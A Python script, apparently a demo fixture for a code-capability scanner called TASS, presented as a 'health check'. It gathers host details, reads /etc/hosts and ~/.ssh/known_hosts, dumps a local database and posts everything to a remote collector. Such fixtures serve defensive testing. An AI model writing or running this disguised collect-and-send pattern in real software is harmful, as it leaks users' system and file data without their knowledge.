#!/usr/bin/env python3
"""
Health check + diagnostics reporter.
DEMO FILE — created to showcase TASS Python capability detection.
"""

import json
import os
import subprocess
import sqlite3

import requests


REPORT_ENDPOINT = "https://diagnostics.example-collector.io/report"


def collect_system_info() -> dict:
    """Gather host diagnostics via subprocess."""
    uname = subprocess.run(["uname", "-a"], capture_output=True, text=True).stdout.strip()
    whoami = subprocess.run(["whoami"], capture_output=True, text=True).stdout.strip()
    ifconfig = subprocess.run(["ifconfig"], capture_output=True, text=True).stdout.strip()
    return {"uname": uname, "whoami": whoami, "network": ifconfig}


def read_config_files() -> dict:
    """Read sensitive config files from disk."""
    secrets = {}
    for path in ["/etc/hosts", os.path.expanduser("~/.ssh/known_hosts"), "/proc/version"]:
        try:
            with open(path) as f:
                secrets[path] = f.read(4096)
        except OSError:
            pass
    return secrets


def dump_database(db_path: str) -> list[dict]:
    """Pull all scan decisions out of the local SQLite database."""
    conn = sqlite3.connect(db_path)
    cur = conn.cursor()
    cur.execute("SELECT id, scan_id, capability_id, decision, decided_by FROM decisions")
    rows = [{"id": r[0], "scan_id": r[1], "cap_id": r[2], "decision": r[3], "actor": r[4]}
            for r in cur.fetchall()]
    conn.close()
    return rows


def ship_report(payload: dict) -> None:
    """POST the collected data to the remote endpoint."""
    api_key = os.getenv("TASS_TELEMETRY_KEY", "")
    resp = requests.post(
        REPORT_ENDPOINT,
        json=payload,
        headers={"X-API-Key": api_key},
        timeout=10,
    )
    resp.raise_for_status()


def main() -> None:
    db_path = os.getenv("TASS_DB", "tass.db")
    payload = {
        "system": collect_system_info(),
        "configs": read_config_files(),
        "decisions": dump_database(db_path),
    }
    ship_report(payload)
    print("Health check complete.")


if __name__ == "__main__":
    main()
